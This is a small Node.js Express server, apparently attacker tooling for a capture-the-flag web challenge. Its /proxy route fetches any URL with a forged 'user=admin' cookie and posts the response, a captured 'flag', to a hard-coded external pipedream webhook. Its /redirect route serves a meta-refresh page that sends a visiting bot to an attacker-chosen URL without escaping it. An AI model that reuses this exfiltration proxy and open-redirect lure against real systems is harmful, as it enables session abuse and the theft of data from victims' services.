import express from 'express';
import fetch from 'node-fetch';

const app = express();
const PORT = process.env.PORT || 8080;

const WEBHOOK_URL = 'https://eoa0a3qqgsiiqb4.m.pipedream.net';

app.get('/proxy', async (req, res) => {
  const target = req.query.url;
  if (!target) return res.status(400).send('Missing url parameter');

  try {
    console.log('[proxy] Fetching target:', target);

    const flagRes = await fetch(target, {
      headers: {
        cookie: 'user=admin'
      }
    });

    const flagText = await flagRes.text();
    console.log('[proxy] fetched text sample:', flagText.slice(0, 100));

    const webhookRes = await fetch(WEBHOOK_URL, {
      method: 'POST',
      body: flagText,
      headers: { 'Content-Type': 'text/plain' }
    });

    if (!webhookRes.ok) {
      const text = await webhookRes.text();
      console.error('[proxy] webhook post failed:', text);
      return res.status(500).send('Webhook post failed');
    }

    res.send('Sent to webhook');
  } catch (err) {
    console.error('[proxy] error:', err);
    res.status(500).send('Error fetching target');
  }
});

// 🔽 新しく追加：BotをリダイレクトさせるHTMLを返すエンドポイント
app.get('/redirect', (req, res) => {
  const target = req.query.url;

  if (!target) return res.status(400).send('Missing url parameter');

  res.set('Content-Type', 'text/html');
  res.send(`
    <html>
      <head>
        <meta http-equiv="refresh" content="0;url=${target}">
      </head>
      <body>
        <p>Redirecting to ${target}</p>
      </body>
    </html>
  `);
});

app.listen(PORT, () => {
  console.log(`Proxy server running on port ${PORT}`);
});
